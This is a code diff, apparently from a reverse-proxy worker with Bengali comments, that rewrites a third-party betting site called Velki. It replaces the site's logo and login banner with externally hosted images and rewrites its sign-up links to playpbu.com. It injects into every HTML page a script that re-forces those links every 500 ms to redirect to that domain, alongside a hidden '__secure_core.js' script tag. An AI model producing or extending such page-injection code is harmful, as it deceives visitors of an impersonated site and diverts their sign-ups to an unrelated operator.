@@ -161,16 +161,45 @@ export default {
         text = text.replaceAll("/assets/images/velki-logo.png", newLogoUrl);
         text = text.replaceAll("assets/images/velki-logo.png", newLogoUrl);
 
+        // 🔹 আপনার নির্দেশ অনুযায়ী লগিন ব্যানার পারফেক্টলি হাইড ও রিপ্লেসমেন্ট 🔹
+        const newLoginBanner = "https://i.postimg.cc/CLCXKkN6/20260408-232743.webp";
+        text = text.replaceAll("../../assets/images/velki-login-signup-banner.png", newLoginBanner);
+        text = text.replaceAll("../assets/images/velki-login-signup-banner.png", newLoginBanner);
+        text = text.replaceAll("/assets/images/velki-login-signup-banner.png", newLoginBanner);
+        text = text.replaceAll("assets/images/velki-login-signup-banner.png", newLoginBanner);
+
+        // 🔹 আপনার নির্দেশ অনুযায়ী Sign Up লিংক পরিবর্তন 🔹
+        text = text.replaceAll('class="signup" href="/"', 'class="signup" href="https://playpbu.com"');
+
         // 🔒 প্রফেশনাল ইনজেকশন (Logo CSS Force + Security JS)
         if (contentType.includes("text/html")) {
-            // 🔹 এখানে width: 115px দেওয়া হয়েছে লোগো বড় দেখানোর জন্য 🔹
-            const forceLogoCSS = `<style>.logo-sec img { content: url("${newLogoUrl}") !important; width: 115px !important; height: auto !important; max-width: none !important; }</style>`;
+            // 🔹 এখানে width: 115px দেওয়া হয়েছে লোগো বড় দেখানোর জন্য এবং লগিন ব্যানারের CSS এড করা হয়েছে 🔹
+            const forceCSS = `<style>
+                .logo-sec img { content: url("${newLogoUrl}") !important; width: 115px !important; height: auto !important; max-width: none !important; }
+                .login-log-sec img { content: url("${newLoginBanner}") !important; width: 100% !important; height: auto !important; }
+            </style>`;
+            
+            // 🔹 সাইন আপ লিংকে ক্লিক করলে যেন কোনোভাবেই মিসটেক না হয় তার জন্য ফোর্স জাভাস্ক্রিপ্ট 🔹
+            const forceJs = `<script>
+                setInterval(() => {
+                    document.querySelectorAll('.signup').forEach(btn => {
+                        if(btn.href !== 'https://playpbu.com/') {
+                            btn.href = 'https://playpbu.com';
+                            btn.onclick = function(e) {
+                                e.preventDefault();
+                                window.location.href = 'https://playpbu.com';
+                            };
+                        }
+                    });
+                }, 500);
+            </script>`;
+
             const ghostScriptTag = `<script src="/__secure_core.js"></script>`;
             
             if (text.includes('<head>')) {
-              text = text.replace('<head>', '<head>' + forceLogoCSS + ghostScriptTag);
+              text = text.replace('<head>', '<head>' + forceCSS + forceJs + ghostScriptTag);
             } else {
-              text = forceLogoCSS + ghostScriptTag + text;
+              text = forceCSS + forceJs + ghostScriptTag + text;
             }
         }
         
